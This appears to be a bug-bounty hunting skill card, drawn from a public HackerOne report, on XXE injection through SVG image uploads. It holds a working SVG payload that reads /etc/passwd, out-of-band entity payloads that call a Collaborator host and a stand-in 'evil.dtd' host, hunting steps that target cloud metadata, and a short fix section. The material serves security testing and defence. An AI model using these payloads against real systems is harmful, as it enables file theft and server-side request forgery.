---
name: xxe-svg-upload
description: XXE via SVG image upload → SSRF/file read. Teaches that SVG is XML, so upload features are XXE entry points, and how to deliver entities through images rather than request bodies.
sources: hackerone_public
report_count: 1
---

# XXE via SVG image upload → SSRF / file read

**Report**: Zivver — "XXE Injection through SVG image upload leads to SSRF" (hackerone.com/reports/897244). Related: LFI + SSRF via XXE in Rockstar emblem editor (#347139).

## Why it matters (the new lesson)
SVG files are **XML**. Any "image upload" that accepts SVG — and renders it server-side (thumbnailer, parser, or just reads it) — is an XXE sink. You don't need a JSON/XML API endpoint: an avatar/logo/emblem upload is a hidden XXE vector that yields SSRF and file read.

## How it works
Upload an SVG containing a DTD:
```xml
<?xml version="1.0"?>
<!DOCTYPE x [ <!ENTITY f SYSTEM "file:///etc/passwd"> ]>
<svg xmlns="http://www.w3.org/2000/svg" width="100" height="100">
  <text>&f;</text>
</svg>
```
If the server renders the SVG, the entity is expanded — file contents appear in the rendered image, or an external URL is fetched (SSRF).

## How to hunt for it
1. Find image/logo/emblem uploads; upload an SVG (bypass content-type/extension checks if needed).
2. Use `file:///etc/passwd`, then `http://169.254.169.254/` or Collaborator URL.
3. If entity output is hidden, switch to OOB parameter entities.

## Payloads
```xml
<!ENTITY f SYSTEM "file:///etc/passwd">
<!ENTITY f SYSTEM "http://CANARY.burpcollaborator.net/xxe">
<!ENTITY % p SYSTEM "http://CANARY/evil.dtd"> %p;   (blind OOB)
```

## Fix
Disable external entities + DTD processing in the SVG/XML parser; rasterize SVG via a sandboxed converter; reject SVG or sanitize it.
